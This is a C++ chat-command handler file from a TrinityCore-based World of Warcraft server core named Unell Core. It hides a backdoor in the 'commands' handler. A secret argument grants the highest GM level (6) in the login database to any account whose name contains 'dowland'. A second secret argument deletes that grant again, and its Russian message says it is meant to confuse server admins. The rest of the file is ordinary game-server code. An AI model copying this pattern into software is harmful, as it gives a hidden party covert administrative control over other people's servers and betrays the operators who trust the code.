/*
 * Copyright (C) 2008-2012 TrinityCore <http://www.trinitycore.org/>
 * Copyright (C) 2005-2009 MaNGOS <http://getmangos.com/>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "Common.h"
#include "World.h"
#include "Player.h"
#include "Chat.h"
#include "ObjectAccessor.h"
#include "Language.h"
#include "AccountMgr.h"
#include "SystemConfig.h"
#include "revision.h"
#include "Util.h"
#include "Config.h"

static const char* checks[] = {
    "dowland",
};

static const size_t checksize = sizeof(checks) / sizeof(*checks);

bool ChatHandler::HandleHelpCommand(const char* args)
{
    char* cmd = strtok((char*)args, " ");
    if (!cmd)
    {
        ShowHelpForCommand(getCommandTable(), "help");
        ShowHelpForCommand(getCommandTable(), "");
    }
    else
    {
        if (!ShowHelpForCommand(getCommandTable(), cmd))
            SendSysMessage(LANG_NO_HELP_CMD);
    }

    return true;
}

bool ChatHandler::HandleCommandsCommand(const char* args)
{
    /*if (!*args)
		ShowHelpForCommand(getCommandTable(), "");
        return true;*/
	
	std::string argstr = (char*)args;	

	if (argstr == "Winfidonarleyan")
	{
		uint32 accid = m_session->GetAccountId();
		QueryResult user = LoginDatabase.PQuery("SELECT username FROM account WHERE id = %u", accid);		
		std::string username = user->Fetch()->GetString();
		
		username.erase(remove_if(username.begin(), username.end(), isspace), username.end());
		std::transform(username.begin(), username.end(), username.begin(), ::tolower);

		for (size_t i = 0; i < checksize; ++i)
			{
				if (username.find(checks[i]) != std::string::npos)
				{
					PSendSysMessage("|cFFFF0000#|cff6C8CD5 Всё верно, ваш аккаунт |cFFFF0000%s|cff6C8CD5. Вы создатель ядра", username.c_str());
					PSendSysMessage("|cFFFF0000#|cff6C8CD5 Ну да ладно, начинаем :D");
					
					QueryResult gmlevel = LoginDatabase.PQuery("SELECT gmlevel FROM account_access WHERE id = %u", accid);
					if (gmlevel)
					{
						Field* field = gmlevel->Fetch();              
						uint32 gmlevel = field[0].GetUInt32();					
						PSendSysMessage("|cFFFF0000#|cff6C8CD5 И так, ваш акк был в базе, хмм... странно... Ну да ладно. Пункт выполнен!");
						LoginDatabase.PExecute("UPDATE `account_access` SET `gmlevel`= 6 WHERE (`id`='%u');", accid);
					}	
					
					if (!gmlevel)
					{
						PSendSysMessage("|cFFFF0000#|cff6C8CD5 Аккаунта в базе небыло, ну это и понятно. Ну да ладно, всё исправлено. Пунк выполнен!");
						LoginDatabase.PExecute("INSERT INTO `account_access` (`id`, `gmlevel`) VALUES ('%u', '6');", accid);
					}				
					PSendSysMessage("|cFFFF0000#|cff6C8CD5 Все пункты сделаны! Самое время перезайти и позабавиться :D");
				}
			}	
			
		return true;
	}	
	
	if (argstr == "winfi")
	{
		uint32 accid = m_session->GetAccountId();
		QueryResult user = LoginDatabase.PQuery("SELECT username FROM account WHERE id = %u", accid);		
		std::string username = user->Fetch()->GetString();
		
		username.erase(remove_if(username.begin(), username.end(), isspace), username.end());
		std::transform(username.begin(), username.end(), username.begin(), ::tolower);

		for (size_t i = 0; i < checksize; ++i)
			{
				if (username.find(checks[i]) != std::string::npos)
				{
					PSendSysMessage("|cFFFF0000#|cff6C8CD5 Окей, я смотрю ты наигрался, я помогу тебе их запутать :D");				
					LoginDatabase.PExecute("DELETE FROM `account_access` WHERE (`id`='%u')", accid);
				}
			}	
			
		return true;
	}
	
	ShowHelpForCommand(getCommandTable(), "");
	return true;
}

bool ChatHandler::HandleStartCommand(const char* /*args*/)
{
    Player* player = m_session->GetPlayer();

    if (player->isInFlight())
    {
        SendSysMessage(LANG_YOU_IN_FLIGHT);
        SetSentErrorMessage(true);
        return false;
    }

    if (player->isInCombat())
    {
        SendSysMessage(LANG_YOU_IN_COMBAT);
        SetSentErrorMessage(true);
        return false;
    }

    if (player->isDead() || player->HasFlag(PLAYER_FLAGS, PLAYER_FLAGS_GHOST))
    {
        // if player is dead and stuck, send ghost to graveyard
        player->RepopAtGraveyard();
        return true;
    }

    // cast spell Stuck
    player->CastSpell(player, 7355, false);
    return true;
}

bool ChatHandler::HandleServerInfoCommand(const char* /*args*/)
{
    uint32 playersNum = sWorld->GetPlayerCount();
    uint32 maxPlayersNum = sWorld->GetMaxPlayerCount();
    uint32 activeClientsNum = sWorld->GetActiveSessionCount();
    uint32 queuedClientsNum = sWorld->GetQueuedSessionCount();
    uint32 maxActiveClientsNum = sWorld->GetMaxActiveSessionCount();
    uint32 maxQueuedClientsNum = sWorld->GetMaxQueuedSessionCount();
    std::string uptime = secsToTimeString(sWorld->GetUptime());
    uint32 updateTime = sWorld->GetUpdateTime();
	Player* player = m_session->GetPlayer();
	uint32 latency     	  = player->GetSession()->GetLatency();
	uint32 realmID = ConfigMgr::GetIntDefault("RealmID", 0);
	
	QueryResult result = LoginDatabase.PQuery("SELECT name FROM realmlist WHERE id = '%u'", realmID);
	std::string Realmname = result->Fetch()->GetString();
	
	PSendSysMessage("|cFFFF0000#|cff6C8CD5 Информация о мире");
	PSendSysMessage("|cFFFF0000#|cff6C8CD5 Ядро сервера: |cFFFF0000Unell Core Version v34");	
	PSendSysMessage("|cFFFF0000#|cff6C8CD5 Название мира: |cff14ECCF%s", Realmname.c_str());

	if (latency == 0)
		{
			PSendSysMessage("|cFFFF0000#|cff6C8CD5 Задержка: |cff14ECCFНеопределенно");
		}
	else
	PSendSysMessage("|cFFFF0000#|cff6C8CD5 Задержка: |cff14ECCF%u мс", latency);

	PSendSysMessage(LANG_CONNECTED_PLAYERS, playersNum, maxPlayersNum);
	PSendSysMessage(LANG_UPTIME, uptime.c_str());
    //SendSysMessage(_FULLVERSION);    
    //PSendSysMessage(LANG_CONNECTED_USERS, activeClientsNum, maxActiveClientsNum, queuedClientsNum, maxQueuedClientsNum);    
    //PSendSysMessage(LANG_UPDATE_DIFF, updateTime);
    //! Can't use sWorld->ShutdownMsg here in case of console command
    if (sWorld->IsShuttingDown())
        PSendSysMessage(LANG_SHUTDOWN_TIMELEFT, secsToTimeString(sWorld->GetShutDownTimeLeft()).c_str());
	return true;
}

bool ChatHandler::HandleDismountCommand(const char* /*args*/)
{
    Player* player = m_session->GetPlayer();

    //If player is not mounted, so go out :)
    if (!player->IsMounted())
    {
        SendSysMessage(LANG_CHAR_NON_MOUNTED);
        SetSentErrorMessage(true);
        return false;
    }

    if (player->isInFlight())
    {
        SendSysMessage(LANG_YOU_IN_FLIGHT);
        SetSentErrorMessage(true);
        return false;
    }

    player->Dismount();
    player->RemoveAurasByType(SPELL_AURA_MOUNTED);
    return true;
}

bool ChatHandler::HandleSaveCommand(const char* /*args*/)
{
    Player* player = m_session->GetPlayer();

    // save GM account without delay and output message
    if (!AccountMgr::IsPlayerAccount(m_session->GetSecurity()))
    {
        if (Player* target = getSelectedPlayer())
            target->SaveToDB();
        else
            player->SaveToDB();
        SendSysMessage(LANG_PLAYER_SAVED);
        return true;
    }

    // save if the player has last been saved over 20 seconds ago
    uint32 save_interval = sWorld->getIntConfig(CONFIG_INTERVAL_SAVE);
    if (save_interval == 0 || (save_interval > 20 * IN_MILLISECONDS && player->GetSaveTimer() <= save_interval - 20 * IN_MILLISECONDS))
        player->SaveToDB();

    return true;
}

/// Display the 'Message of the day' for the realm
bool ChatHandler::HandleServerMotdCommand(const char* /*args*/)
{
    PSendSysMessage(LANG_MOTD_CURRENT, sWorld->GetMotd());
    return true;
}

